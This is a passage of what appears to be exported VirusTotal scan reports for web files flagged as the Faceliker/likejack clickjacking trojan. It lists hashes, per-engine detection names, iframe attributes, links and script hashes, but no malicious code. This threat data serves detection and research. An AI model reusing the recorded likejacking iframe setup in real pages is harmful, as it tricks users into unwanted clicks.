          "result": "Trojan.W32.js.agent.gdg",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "HTML/IFrame.B!tr",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.8.8378.0",
          "result": "HTML:Iframe-inf [Susp]",
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230804"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language",
          "probability": 100
        }
      ],
      "sha256": "b35429ee9e70c262f5a96739d432f22e0d9046b53396296a1fdbd9fe2510285b",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1691151981,
      "unique_sources": 1,
      "first_submission_date": 1691040658,
      "ssdeep": "192:xQUeRd+hjlZbPIqO4ZWnXuRd+iE7RD5NI:qH2nbDHINI",
      "md5": "7906002466f0918b0597f0548d2847fe",
      "sha1": "0307cf8a90e7a4ea485ad2b509b53a10f1adb033",
      "magic": "HTML document, ASCII text",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 1,
        "malicious": 38,
        "undetected": 20
      },
      "meaningful_name": "symbian-phone.php",
      "reputation": -7
    },
    "type": "file",
    "id": "b35429ee9e70c262f5a96739d432f22e0d9046b53396296a1fdbd9fe2510285b",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/b35429ee9e70c262f5a96739d432f22e0d9046b53396296a1fdbd9fe2510285b"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f28c34efb2fbeeb57228"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T124E209CFAD89E82B45938279F1F2DA04E04B6267D241C8C5B0EE846B6FC1FC5AE1535D",
      "vhash": "htm:3e74c00a4e4af5d71196838ad4ba0d82",
      "type_tags": [
        "internet",
        "html"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.",
          "source": "https://github.com/InQuest/yara-rules-vt",
          "author": "InQuest Labs",
          "ruleset_name": "Base64_Encoded_URL",
          "rule_name": "Base64_Encoded_URL",
          "ruleset_id": "0122bae1e9"
        }
      ],
      "names": [],
      "last_modification_date": 1706309276,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 33270,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.likejack/faceliker",
        "popular_threat_category": [
          {
            "count": 19,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 8,
            "value": "likejack"
          },
          {
            "count": 7,
            "value": "faceliker"
          },
          {
            "count": 2,
            "value": "autolike"
          }
        ]
      },
      "html_info": {
        "iframes": [
          {
            "attributes": {
              "allowtransparency": "true",
              "src": "http://www.facebook.com/plugins/like.php?href=http://www.facebook.com/yolguzergahi&layout=button_count&show_faces=false&width=50&action=like&colorscheme=light&height=21",
              "style": "border: none; overflow: hidden; width: 45px; left: -19px; height: 21px; z-index: 0; position: relative;",
              "scrolling": "no",
              "frameborder": "0"
            }
          },
          {
            "attributes": {
              "src": "http://ad.hepsiburada.com/advEngine.aspx?accountID=11b42608-fd1b-40a8-a59d-bf1da3bfe64e&categoryID=25&sizeID=8",
              "height": "60px",
              "scrolling": "no",
              "frameborder": "0",
              "width": "468px"
            }
          },
          {
            "attributes": {
              "allowtransparency": "true",
              "src": "http://www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Fwww.facebook.com%2Fpages%2FDestegi%2F173214066036266&width=270&colorscheme=light&connections=8&stream=false&header=true&height=290",
              "style": "border:none; overflow:hidden; width:270px; height:290px;",
              "scrolling": "no",
              "frameborder": "0"
            }
          }
        ],
        "title": "İşte Ak Parti’nin Gül savunması - Rafist Genel Bilgiler",
        "hrefs": [
          "http://www.rafist.com/wp-content/themes/internet-10/style.css",
          "http://www.rafist.com/feed",
          "http://www.rafist.com/gundem/iste-ak-partinin-gul-savunmasi.html/feed",
          "http://www.rafist.com/wp-content/plugins/add-to-any/addtoany.min.css?ver=1.4",
          "http://www.rafist.com/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70",
          "http://www.rafist.com/xmlrpc.php?rsd",
          "http://www.rafist.com/wp-includes/wlwmanifest.xml",
          "http://www.rafist.com/gundem/biraderleri-youtube-korkusu-sardi.html",
          "http://www.rafist.com/gundem/cocuklar-internet-icin-ne-kadar-tehlikeli.html",
          "http://www.rafist.com/gundem/iste-ak-partinin-gul-savunmasi.html",
          "http://www.rafist.com/?p=6905",
          "http://www.rafist.com/",
          "javascript:window.external.AddFavorite('http://www.rafist.com','iki dakika da haberler')",
          "http://www.rafist.com",
          "http://www.rafist.com/adsense",
          "http://www.rafist.com/gazete-mansetleri",
          "http://www.rafist.com/iletisim",
          "http://www.rafist.com/kullanim-sozlesmesi",
          "http://www.rafist.com/yasal-uyari",
          "http://www.cnc.ist",
          "http://twitter.com/yucinbil",
          "http://twitter.com/share?url=http://www.rafist.com/gundem/iste-ak-partinin-gul-savunmasi.html&via=&text=İşte Ak Parti'nin Gül savunması&related=:&lang=en&count=horizontal",
          "http://www.addtoany.com/share_save",
          "http://www.firsatteklifi.com/evbasvuru.html?bid=468&aid=CD1089&opt=",
          "http://www.rafist.com/yasam/cicek-saksilari.html",
          "http://www.rafist.com/gundem/cocuk-kitaplari-web-sitesi-acildi.html",
          "http://www.rafist.com/gundem/fabrika-insaati-web-sitesi-acildi.html",
          "http://www.rafist.com/ekonomi/hazir-beton.html",
          "http://www.rafist.com/teknoloji/pirelli-2012-takvimi-cekimi-galeri.html",
          "http://www.rafist.com/teknoloji/kral-oyun-oyna-ucretsiz-oyun-oyna-hafiza-oyunlari-burada-3.html",
          "http://www.rafist.com/teknoloji/oyun-oyna-3d-oyunla-araba-oyunu-silah-oyunu-flash-oyunlar-burada.html",
          "http://www.rafist.com/teknoloji/fatmagulun-sucu-ne-yeni-sezon-ilk-fragmani-sitemizde-2011fatmagulun-sucu-ne-yeni-sezon-fragman-video-izle-kanal-d-eylul-2011.html",
          "http://www.rafist.com/teknoloji/oyle-bir-gecer-zamanki-dizisi-yeni-sezon-ilk-fragmani-izle.html",
          "http://www.rafist.com/teknoloji/2011-universite-harclari-universite-kayit-evraklari-2011-2012.html",
          "http://www.rafist.com/kategori/gundem",
          "#comments",
          "http://del.icio.us/post?url=http://www.rafist.com/gundem/iste-ak-partinin-gul-savunmasi.html&title=İşte Ak Parti’nin Gül savunması ",
          "http://www.digg.com/submit?phase=2&url=http://www.rafist.com/gundem/iste-ak-partinin-gul-savunmasi.html&title=İşte Ak Parti’nin Gül savunması",
          "http://www.rafist.com/wp-login.php",
          "http://www.teknikhirdavatci.com",
          "http://www.mardenhotel.com",
          "http://www.avrupasu",
          "http://www.yapimarketler.com",
          "http://www.rafist.com/comments/feed",
          "http://www.gthtools.com",
          "http://www.ekizlermakine.com",
          "http://www.kalipci.com",
          "http://www.makineci.com",
          "mailto:info@rafist.com",
          "http://www.wordpress.org",
          "http://www.sayyac.com/",
          "http://www.rafist.com/sitemap.xml",
          "http://www.toplist.cz/",
          "http://www.toplist.sk/"
        ],
        "scripts": [
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "eb5594be6cf5301bf0a7bd3e475cea4e1153c71f6a1cc1aa2f5cccd337e023d0"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "d562453e054f8c9ff50c1335de1fdd4e2a484b8c05c91a25a5fde55f4de760c4"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "538c2003bbdb171442b07a19005b47efed1eed218b955e8ce2e385712f5d234a"
          },
          {
            "attributes": {
              "src": "http://code.jquery.com/jquery-1.10.2.min.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "6c47ce9722ed00436954a66ce739831c7eac9274e3a50832aee7c428abe02cdc"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "dc633901ff61bb40eb4022e1b63a118277adbb2d5e4e1994abce0db6840a83d1"
          },
          {
            "attributes": {
              "src": "http://platform.twitter.com/widgets.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "6fab79f09cede700a9eaa896e749287660d0a1f39d243434985924232e4e71f0"
          },
          {
            "attributes": {
              "src": "http://pagead2.googlesyndication.com/pagead/show_ads.js",
              "type": "text/javascript"
            },
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "57a7669e7004fad966f576aba58c12e86569954f6342fe8266e0f8106eed905b"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "9ed7b86cc462e6fb331cad7ce9e046c3cb1b4e5d6f7297005253d36821f83c02"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "2f9a031f562d63681960bbc2ca186b83fa42ecdafd66133335bed53a777c5c5b"
          },
          {
            "attributes": {
              "src": "http://www.google.com/friendconnect/script/friendconnect.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "a5cd95986cfa8c38edc79334504f0d4c79df2b33c992ad968a21306085d3c23b"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "e8e1636ccdb2b7951726743caac21a2ade86b909e13cf634a3a8246d7ef35537"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "006cd3619ab40d259ab7623aec6f93eeaa294a218588bda0296f71bb7c878aed"
          },
          {
            "attributes": {
              "id": "_wauf2m"
            },
            "sha256": "22e151576fe2a58f150d6060d266a5e7145852081c8299b7c67fde8b67a8fb30"
          },
          {
            "attributes": {
              "src": "http://xslt.alexa.com/site_stats/js/t/a?url=www.rafist.com",
              "type": "text/javascript",
              "language": "JavaScript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "7c74b1e0329867f511d6e994ac974f9c8e9db0442381e90744b0a49c2de5c25f"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "740639ac4e25383876aed501a498ef77115762b544e8b3ef6afcea8e581438c2"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "8973f1dbe09994469dc37c4d48453881ac0ba1b7eccca514daad88fba1da7ef2"
          },
          {
            "attributes": {
              "type": "text/javascript",
              "language": "JavaScript"
            },
            "sha256": "d1eda05435600f9ffe648d96770ad814b016bc12f4c2995bd81b85581f1feb9f"
          }
        ],
        "html_meta": {
          "googlebot": [
            "index, follow",
            "index, archive",
            "all"
          ],
          "classification": [
            "forex"
          ],
          "abstract": [
            "forex"
          ],
          "revisit-after": [
            "1 days"
          ],
          "msvalidate.01": [
            "2E0F73969ABB38975E9B1CB39D6A8C1D",
            "2E0F73969ABB38975E9B1CB39D6A8C1D"
          ],
          "keywords": [
            "gül,işte,gündem"
          ],
          "gigabot": [
            "index, archive",
            "index, follow",
            "all"
          ],
          "dmozbot": [
            "index, follow"
          ],
          "content-language": [
            "tr"
          ],
          "author": [
            "forex"
          ],
          "msnbot": [
            "index, follow"
          ],
          "excitebot": [
            "index, follow"
          ],
          "lycosbot": [
            "index, follow"
          ],
          "iwonbot": [
            "index, follow"
          ],
          "verify-v1": [
            "RpuzsAd0ofFwNLTs6Giwf/EJCmx3wZKxo+UOXPj66Iw="
          ],
          "description": [
            "Yargıtay, Aziz Nesin'in kendisine Vatan haini diyen Kenan Evren hakkında açmak istediği tazminat davasına, Evren Cumhurbaşkanı olduğu için izin"
          ],
          "robots": [
            "index, follow",
            "index, archive",
            "all"
          ],
          "askbot": [
            "index, follow"
          ],
          "alexabot": [
            "index, follow"
          ],
          "generator": [
            "WordPress 3.5.1",
            "WordPress 3.5.1"
          ],
          "altavistabot": [
            "index, follow"
          ],
          "aolbot": [
            "index, follow"
          ],
          "google-site-verification": [
            "Bqf4GbgKhLsZM44DUP7zLOzJZPvWmvBDwVjrI4fobsw"
          ],
          "gigablast": [
            "index, follow"
          ],
          "yahoobot": [
            "index, follow"
          ]
        }
      },
      "last_submission_date": 1694560480,
      "reputation": -7,
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "c7364ea49c17cab1c3a7d6955289d5481c4111e9db8de987933db75ca85c361d",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1694560480,
      "unique_sources": 1,
      "first_submission_date": 1694560480,
      "ssdeep": "768:a20BNWB+2lJTJl+VoXuI2VP74U3zMb7UBCtdEES:a20BNWB+2lJTJl+Voj2VP7H3g/UBCHEl",
      "md5": "7893ecb2059bbc46e0bf958ece45e903",
      "sha1": "8fc3f51b3c8154fe95c85b67d24be350997e0eb4",
      "magic": "HTML document, Unicode text, UTF-8 text, with very long lines (1126u), with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 36,
        "undetected": 23
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.106",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "JS.Faceliker.NC",
          "method": "blacklist",
          "engine_update": "20230911"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "JS/Faceliker.a",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "JS:Trojan.JS.Likejack.A",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Generic-Script.Save.3e62ca52",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.114.49573",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.114.49574",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.534",
          "result": "JS.Agent.FY",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": "JS/Faceliker.A!Eldorado",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "ISB.Malscript!gen3",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "27897",
          "result": "JS/TrojanClicker.Agent.NGA",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.453",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230910"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.8.8378.0",
          "result": "HTML:Autolike-B [Trj]",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Script.Generic",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "JS:Trojan.JS.Likejack.A",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.AgentClick.dchycs",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "JS:Trojan.JS.Likejack.A",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.FaceLiker/JS!1.A0E3 (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-09-12.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Mal/FBJack-R",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.JS/FaceLiker.EB.19",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "JS.Click.370",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4953",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.HTML.RceGen5.nq",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.91",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230907"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "JS:Trojan.JS.Likejack.A",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "JS:Trojan.JS.Likejack.A (B)",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230912-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230911"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "JS/FaceLiker.EB.19",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23080.2005",
          "result": "Trojan:Script/Wacatac.B!ml",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.138.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36001",
          "result": "TrojWare.JS.Clickjack.AH@7phcf4",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "JS:Trojan.JS.Likejack.A",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230911"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Script.Generic",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36489B:27.33118",
          "result": "HTML.Trojan.Clickjack.B",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1694556034",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230904"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": "Trojan/JS.Faceliker.SC184920",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "JS:Trojan.JS.Likejack.A",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=85)",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230830"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Heur:Trojan.Script.LS_Gencirc.7058808.0",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan-Clicker.JS.Agent",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.js.likejack.a",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/FBJack.I!tr",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.8.8378.0",
          "result": "HTML:Autolike-B [Trj]",
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230911"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230912"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      }
    },
    "type": "file",
    "id": "c7364ea49c17cab1c3a7d6955289d5481c4111e9db8de987933db75ca85c361d",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c7364ea49c17cab1c3a7d6955289d5481c4111e9db8de987933db75ca85c361d"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f3a27351d3c42d2876a1"
  },
  "data": {
    "attributes": {
      "type_description": "JavaScript",
      "tlsh": "T16EC1A60A5DA7CC87872151BDF872BB6D84568193E3029EA1F0B64F077A41FCACC46C5E",
      "vhash": "a7f942f015a7c28212e8b62f978107eb",
      "type_tags": [
        "source",
        "javascript",
        "js"
      ],
      "names": [
        "VirusShare_7880cf69506ffb0b429b0e5dd81240c2"
      ],
      "last_modification_date": 1706307212,
      "type_tag": "javascript",
      "times_submitted": 2,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 6051,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.",
        "popular_threat_category": [
          {
            "count": 17,
            "value": "trojan"
          }
        ]
      },
      "html_info": {
        "html_meta": {
          "google-site-verification": [
            "xdRne5YZQo3joMIszqVy-nPit5-vmP1YPAMnbr7eVmA"
          ]
        },
        "hrefs": [
          "/css/structure.css",
          "/css/main.css",
          "recipe.asp?name=Carne Asada Tacos&id=1187&lang=ru",
          "recipe.asp?name=  &id=257&lang=ru",
          "recipe.asp?name=      ,   &id=2016121613&lang=ru",
          "recipe.asp?name=     &id=1170&lang=ru",
